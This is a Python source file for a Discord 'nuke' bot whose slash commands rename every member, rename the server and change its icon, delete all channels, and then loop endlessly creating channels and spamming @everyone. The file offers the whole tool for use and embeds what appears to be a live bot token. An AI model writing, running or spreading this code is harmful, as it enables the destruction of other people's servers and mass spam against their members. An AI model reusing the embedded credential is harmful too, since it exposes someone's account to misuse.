import discord
from discord.ext import commands
import requests

TOKEN = 'MTA5NTUxNTI4NDYzNjQ1MDg5Nw.GvlysN.pV17l6iULk9i9X0gt4wyjz6veynEKxBPN8p2UQ'

nickName = "Nickname"
image_url = "https://cdn.wallpapersafari.com/61/15/RQbVOd.jpg"
serverName = "Server Name"
channelName = 'Channel Name'
message =  "@everyone"


intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
  print(f'Logged in as {bot.user}')
  print("/nuke - Destroys the server\n/nicknuke - Nicks everyone a nickname of your choosing\n/removeall - Deletes every channel")

@bot.slash_command(name="nuke")
async def nuke(ctx):
  for member in ctx.guild.members:
    print(member)
    try:
      await member.edit(nick=nickName)
    except:
      print("Failed nickname")
  
  try:
    await ctx.guild.edit(name=serverName)

    response = requests.get(image_url)
    image_data = response.content
    await ctx.guild.edit(icon=image_data)
  except:
    print("Failed edit")
  
  print("Beginning Nuke")
  for channel in ctx.guild.channels:
      try:
        await channel.delete()
      except:
        print("Failed delete")

  while True:
    await ctx.guild.create_text_channel(channelName)
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except:
        print("Failed send")
        

@bot.slash_command(name="nicknuke")
async def nicknuke(ctx):
  for member in ctx.guild.members:
    print(member)
    try:
      await member.edit(nick=nickName)
    except:
      print("Failed nickname")


@bot.slash_command(name="removeall")
async def remove(ctx):
  for channel in ctx.guild.channels:
    await channel.delete()

bot.run(TOKEN)